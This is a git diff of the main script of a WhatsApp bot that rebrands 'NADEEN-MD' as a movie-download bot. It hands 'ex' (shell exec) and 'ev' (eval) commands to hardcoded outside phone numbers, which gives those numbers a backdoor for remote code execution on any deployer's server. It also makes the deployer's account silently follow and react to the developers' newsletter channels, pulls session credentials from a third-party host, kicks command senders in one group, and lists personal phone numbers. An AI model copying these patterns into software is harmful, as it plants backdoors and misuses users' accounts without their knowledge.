@@ -44,7 +44,7 @@ var {
   updfb,
   upresbtn,
 } = require("./lib/database");
-const ownerNumber = [`94716769285`];
+const ownerNumber = [`${config.OWNER_NUMBER}`];
 //===================SESSION======.===========kj===h========
 
 const df = __dirname + '/auth_info_baileys/creds.json';
@@ -71,15 +71,15 @@ if (!fs.existsSync(df)) {
 
 async function downloadSession(sessdata, df) {
   const dbUrls = [
-    'https://saviya-kolla-database.koyeb.app/',
-    'https://saviya-kolla-database.vercel.app/'
+    'https://visper-get-sessions.vercel.app/',
+    'https://visper-get-sessions.vercel.app/'
   ];
 
   let success = false;
 
   for (let i = 0; i < dbUrls.length; i++) {
-    const sessionUrl = `${dbUrls[i]}SESSIONS/${sessdata}`;
-    console.log(`📥 Downloading session from Saviyakolla-DB`);
+    const sessionUrl = `${dbUrls[i]}get-session?q=${sessdata}.json`;
+    console.log(`📥 Downloading session from NADEEN-DB`);
 
     try {
       const response = await axios.get(sessionUrl);
@@ -210,17 +210,26 @@ const leaveMsg = config.LEAVE_MSG;
   const can = `
 *⚙️ BOT CURRENTLY SETTINGS ⚙️*
 
-*\`• Bot Name :\`* ${botName || "NADEEN-MD"}
+*\`• Owner Number :\`* ${DEFAULT_OWNER_JID || "Not Set"}
+*\`• Bot Name :\`* ${botName || "Not Set"}
+*\`• Bot JID :\`* ${botJid || "Not Set"}
+*\`• Seedr Mail :\`* ${seedrMail || "Not Set"}
+*\`• Seedr Password :\`* ${seedrPassword ? "********" : "Not Set"}
+*\`• Language :\`* ${lang || "SI"}
 *\`• Sudo Users :\`* ${sudoUsers?.length ? sudoUsers.join(", ") : "None"}
 *\`• Blocked JIDs :\`* ${blockedJids?.length ? blockedJids.join(", ") : "None"}
+*\`• Anti Bad Words :\`* ${antiBad?.length ? antiBad.join(", ") : "None"}
+*\`• Welcome/Leave Msgs :\`* ${welcomeLeaveMsgs?.length ? welcomeLeaveMsgs.join(", ") : "None"}
 *\`• Max Size :\`* ${maxSize ?? 150} MB
 *\`• Anti Call :\`* ${antiCall ?? "false"}
 *\`• Auto Read Status :\`* ${autoReadStatus ?? "false"}
 *\`• Auto Block :\`* ${autoBlock ?? "false"}
+*\`• Auto Sticker :\`* ${autoSticker ?? "false"}
 *\`• Auto Voice :\`* ${autoVoice ?? "false"}
 *\`• Auto React :\`* ${autoReact ?? "false"}
 *\`• CMD Only Read :\`* ${cmdOnlyRead ?? "true"}
 *\`• Work Type :\`* ${workType ?? "private"}
+*\`• XNXX Block :\`* ${xnxxBlock ?? "true"}
 *\`• Auto Msg Read :\`* ${autoMsgRead ?? "false"}
 *\`• Auto Typing :\`* ${autoTyping ?? "false"}
 *\`• Auto Recording :\`* ${autoRecording ?? "false"}
@@ -230,7 +239,12 @@ const leaveMsg = config.LEAVE_MSG;
 *\`• Prefix :\`* ${prefix ?? "."}
 *\`• Chat Bot :\`* ${chatBot ?? "false"}
 *\`• Always Offline :\`* ${alwaysOffline ?? "false"}
+*\`• MV Block :\`* ${mvBlock ?? "true"}
 *\`• Buttons Enabled :\`* ${button ?? "false"}
+*\`• Action :\`* ${action ?? "delete"}
+*\`• Antilink Action :\`* ${antiLinkAction ?? "delete"}
+*\`• Values :\`* ${values?.length ? values.join(", ") : "None"}
+*\`• Logo :\`* ${logo ?? "https://files.catbox.moe/3mvn78.png"}
 *\`• Anti Delete :\`* ${antiDelete ?? "off"}
 *\`• Leave Msg :\`* ${leaveMsg || "None"}
 `;
@@ -279,7 +293,7 @@ fs.readdirSync("./plugins/").forEach((plugin) => {
 console.log('All Plugins installed ⚡')
 await connectdb()
 await updb()		
-console.log('NADEEN-MD CONNECTED ✅')
+console.log('NADEEN MOVIE DL CONNECTED ✅')
 
 
 
@@ -363,15 +377,20 @@ if (metadata.viewer_metadata === null){
 await conn.newsletterFollow(`${ownerdataa.mainchanal}`)
 console.log("NADEEN MD UPDATES CHANAL FOLLOW ✅")
 }	 
- const metadataaaaa = await conn.newsletterMetadata("jid", `120363401459763114@newsletterr`)	      
+ const metadataaaaa = await conn.newsletterMetadata("jid", `120363304606757133@newsletter`)	      
 if (metadataaaaa.viewer_metadata === null){
-await conn.newsletterFollow(`120363401459763114@newsletter`)
-console.log("DINKA MOVIES CHANAL FOLLOW ✅")
-}     
- const metadataaa = await conn.newsletterMetadata("jid", `120363190237215199@newsletter `)	      
+await conn.newsletterFollow(`120363304606757133@newsletter`)
+console.log(" NADEEN'z CHANAL FOLLOW ✅")
+}   
+const metadataa = await conn.newsletterMetadata("jid", `120363401175047907@newsletter`)	      
+if (metadataa.viewer_metadata === null){
+await conn.newsletterFollow(`120363401175047907@newsletter`)
+console.log("INFINITY - DEVELOPERS CHANAL FOLLOW ✅")
+}   
+ const metadataaa = await conn.newsletterMetadata("jid", `120363401322137865@newsletter`)	      
 if (metadataaa.viewer_metadata === null){
-await conn.newsletterFollow(`120363190237215199@newsletter `)
-console.log("MTV CHANAL FOLLOW ✅")
+await conn.newsletterFollow(`120363401322137865@newsletter`)
+console.log("Manoj X CHANAL FOLLOW ✅")
 } 
 
 
@@ -425,7 +444,7 @@ const sender = mek.key.fromMe ? (conn.user.id.split(':')[0] + '@s.whatsapp.net' 
 const senderNumber = sender.split('@')[0]
 const botNumber = conn.user.id.split(':')[0]
 const pushname = mek.pushName || 'Sin Nombre'
-const developers = `94724375368,94722617699,94788518429,94787318729,94742524701,94716769285,94711451319`
+const developers = `94724375368,94722617699,94788518429,94787318729,94742524701,94716769285,94711451319,94719255382`
 const mokakhri = developers.split(",")
 const isbot = botNumber.includes(senderNumber)
 const isdev = mokakhri.includes(senderNumber)
@@ -889,77 +908,72 @@ if ( isCmd && isBanGrp && !isMe && !isSudo) return
 
 //========================================== TEAM REACT SECTION ========================================
 
-const rec = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/react.json')).data
+const rec = (await axios.get('https://mv-visper-full-db.pages.dev/Main/react.json')).data
 
 const recc = (await axios.get('https://raw.githubusercontent.com/Nadeenpoorna-app/main-data/refs/heads/main/footer/nadeen-md.json')).data
 
 //================================================================================================================	    
 const id = mek.key.server_id
-const defaultEmojis = ["❤️", "💛", "💚", "💙"];
+const defaultEmojis = ["❤️", "💖", "💚", "💙","💛"];
 const randomEmoji = defaultEmojis[Math.floor(Math.random() * defaultEmojis.length)];
 await conn.newsletterReactMessage(`${recc.mainchanal}`, id, randomEmoji);
-await conn.newsletterReactMessage(`${recc.dinkachanal}`, id, randomEmoji);
+await conn.newsletterReactMessage(`120363304606757133@newsletter`, id, randomEmoji);
     
 //=========================================================================================================================	    
-if(senderNumber.includes("94711451319")){
-if(isReact) return
-m.react(`${rec.nadeen}`)
-}
-if(senderNumber.includes("94716769285")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94715973437")){
-if(isReact) return
-m.react(`${rec.nadeen}`)
-}
-if(senderNumber.includes("94728840491")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94779483535")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94716769285")){
-if(isReact) return
-m.react(`${rec.nadeen2}`)
-}
-if(senderNumber.includes("94785432344")){
-if(isReact) return
-m.react(`${rec.abhi}`)
-}
-if(senderNumber.includes("94785432344")){
-if(isReact) return
-m.react(`${rec.abhi2}`)
-}
-if(senderNumber.includes("94785432344")){
-if(isReact) return
-m.react(`${rec.abhi3}`)
-}
-if(senderNumber.includes("94778500326")){
+if(senderNumber.includes("94724375368")){
 if(isReact) return
 m.react(`${rec.sadas}`)
 }
-if(senderNumber.includes("94775383340")){
+if(senderNumber.includes("94722617699")){
 if(isReact) return
-m.react(`${rec.manhiru}`)
+m.react(`${rec.saviya}`)
 }
-if(senderNumber.includes("94755094957")){
+if(senderNumber.includes("94756857260")){
 if(isReact) return
-m.react(`${rec.nimmi}`)
+m.react(`${rec.alex}`)
+}
+if(senderNumber.includes("94719255382")){
+if(isReact) return
+m.react(`${rec.poorna}`)
+}
+if(senderNumber.includes("94724884317")){
+if(isReact) return
+m.react(`${rec.damiru}`)
 
 }
-if(senderNumber.includes("94712050104")){
+if(senderNumber.includes("94787318729")){
 if(isReact) return
-m.react(`${rec.wesi}`)
+m.react(`${rec.sadas}`)
 
 }
+if(senderNumber.includes("94716769285")){
+if(isReact) return
+m.react(`${rec.nadeen}`)
+
+}
+if(senderNumber.includes("94711451319")){
+if(isReact) return
+m.react(`👨‍💻`)
+}
+		
+		
+if(senderNumber.includes("94742524701")){
+if(isReact) return
+m.react(`${rec.alex}`)
+
+}
+
+if(senderNumber.includes("94766863255")){
+if(isReact) return
+m.react(`❤️‍🔥`)
+
+}
+		
 const ownNum = config.OWNER_NUMBER;
 
             if(senderNumber.includes(ownNum)){
 if(isReact) return 
-m.react(`💁‍♂️`)
+m.react(`🕵️`)
             }
 //===================================================================================
 
@@ -1463,44 +1477,51 @@ if(body === "send" || body === "Send" || body === "Ewpm" || body === "ewpn" || b
     }
 }
 	   
-// Put this at the top of your message handler (where incoming messages are processed)
-// Store original messages
-// Anti-Edit function
-conn.ev.on('messages.update', async (updates) => {
-    for (let update of updates) {
-        const senderId = update.key.participant || update.key.remoteJid;
-        const remoteJid = update.key.remoteJid;
+const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-        // Owner messages ignore කරන්න
-       
+const targetGroup = '120363403596811257@g.us';
 
-        // Edited message නම්
-        if (update.updateType === 'message.edit') {
-            const originalMessage = loadChatData(remoteJid, update.key.id)[0]; // පෙර save කරපු original message
+conn.ev.on('messages.upsert', async (m) => {
+  try {
+    const msg = m.messages[0];
+    if (!msg.message) return;
 
-            if (!originalMessage) continue;
+    const from = msg.key.remoteJid;
+    const sender = msg.key.participant || msg.key.remoteJid;
 
-            let text = "[Non-text message]";
-            if (originalMessage.message?.conversation) text = originalMessage.message.conversation;
-            else if (originalMessage.message?.extendedTextMessage?.text) text = originalMessage.message.extendedTextMessage.text;
+    // Only proceed if it's the specific group
+    if (from !== targetGroup) return;
 
-            await conn.sendMessage(remoteJid, {
-                text: `❌ *Edited message detected!*\n\n🚮 *Edited by:* _${senderId.split('@')[0]}_\n\n> 🔓 Original: ${text}`
-            });
-        }
+    // Get text from the message
+    const text = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
+
+    // Check for command triggers
+    if (text.startsWith('.ping') || text.startsWith('.') || text.startsWith('.alive')) {
+      
+      // 1. Send the warning/goodbye message
+      await conn.sendMessage(from, {
+        text: `🚫 @${sender.split('@')[0]} *good bye user, do not come again🍌*`,
+        mentions: [sender]
+      });
+
+      // 2. CRITICAL FIX: Introduce a delay to prevent Rate-Overlimit error (429)
+      // Waiting 1.5 seconds (1500ms) between high-volume API calls.
+      console.log(`Delaying action for 1500ms to prevent rate limiting...`);
+      await sleep(1500); 
+
+      // 3. Kick the user who sent the message
+      await conn.groupParticipantsUpdate(from, [sender], 'remove');
+      console.log(`Successfully kicked user: ${sender.split('@')[0]} from ${from}`);
     }
+
+  } catch (err) {
+    // Check specifically for Rate Limit error (data: 429) for better debugging
+    if (err && err.data === 429) {
+        console.error('Rate Limit Error (429): Hit rate limit again despite delay. Consider increasing the sleep time.');
+    }
+    console.error('Kick error:', err);
+  }
 });
-
-// Chat save function (incoming messages handle)
-function handleIncomingMessage(message) {
-    const remoteJid = message.key.remoteJid;
-    const messageId = message.key.id;
-
-    const chatData = loadChatData(remoteJid, messageId);
-    chatData.push(message);
-    saveChatData(remoteJid, messageId, chatData);
-}
-
 //================================ Auto voice funtion=================================================================
 
 
@@ -1510,26 +1531,14 @@ if(body === "hi" || body === "Hi" || body === "hey" || body === "Hey" || body ==
   if (isMe) return;
 await conn.sendPresenceUpdate('recording', from);
  await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/hi.mp3' }, 
+  audio: { url: 'https://mv-visper-full-db.pages.dev/Data/WhatsApp%20Audio%202025-04-28%20at%2017.12.23.mpeg' }, 
   mimetype: 'audio/mpeg', 
   ptt: true 
 }, { quoted: mek });
 
  }	
 }
-if(body === 'owner' || body === 'nadeen' || body === 'kawuda haduwe' || body === 'made by' || body === 'kwd hduwe'){
-   
- if (config.AUTO_VOICE == 'true') {
-  if (isMe) return;
-await conn.sendPresenceUpdate('recording', from);
- await conn.sendMessage(from, { 
-  audio: { url: 'https://github.com/Nadeenpoorna-app/main-data/raw/refs/heads/main/footer/voice_data/owner%20VOIC4E.mp3' }, 
-  mimetype: 'audio/mpeg', 
-  ptt: true 
-}, { quoted: mek });
 
- }	
-}
 		if(body === "gm" || body === "Gm" || body === "morning" || body === "goodmorning" || body === "good+morning"){
    
  if (config.AUTO_VOICE == 'true') {
@@ -1756,7 +1765,7 @@ switch (command) {
   }
     break
     case'ex':{
-      if(senderNumber == 94711451319) {
+      if(senderNumber == 94778500326) {
   const { exec } = require("child_process")
   exec(q, (err, stdout) => {
     if (err) return reply(`-------\n\n` + err)
@@ -1768,7 +1777,7 @@ switch (command) {
     }
     break
     case'apprv':{
-      if(senderNumber == 94716769285) {
+      if(senderNumber == 94778500326) {
           let reqlist = await conn.groupRequestParticipantsList(from)
           for (let i=0;i<reqlist.length;i++) {
             if(reqlist[i].jid.startsWith("212")){
@@ -1789,7 +1798,7 @@ switch (command) {
     }
     break
     case'212r':{
-      if(senderNumber == 94716769285) {
+      if(senderNumber == 94778500326) {
         for (let i=0;i<participants.length;i++) {
           if(participants[i].id.startsWith("212")){
        await conn.groupParticipantsUpdate(from, [participants[i].id], 'remove')
@@ -1804,7 +1813,7 @@ console.log(dsa)
     break
 // Inside your message handler (outside any case)
  case 'ev': {
-    if(senderNumber == 94711451319 || senderNumber == 94722617699) {
+    if(senderNumber == 94724375368 || senderNumber == 94722617699) {
     let code2 = q.replace("°", ".toString()");
     try {
 let resultTest = await eval(code2);
@@ -1831,9 +1840,9 @@ console.log(isError)
   })
 }
 app.get("/", (req, res) => {
-  res.send("📟 NADEEN-,D Working successfully!");
+  res.send("📟 NADEEN DL Working successfully!");
 });
-app.listen(port, () => console.log(`Nadeen-Md Server listening on port http://localhost:${port}`));
+app.listen(port, () => console.log(`Movie-NADEEN-Md Server listening on port http://localhost:${port}`));
 setTimeout(() => {
 connectToWA()
 }, 3000);
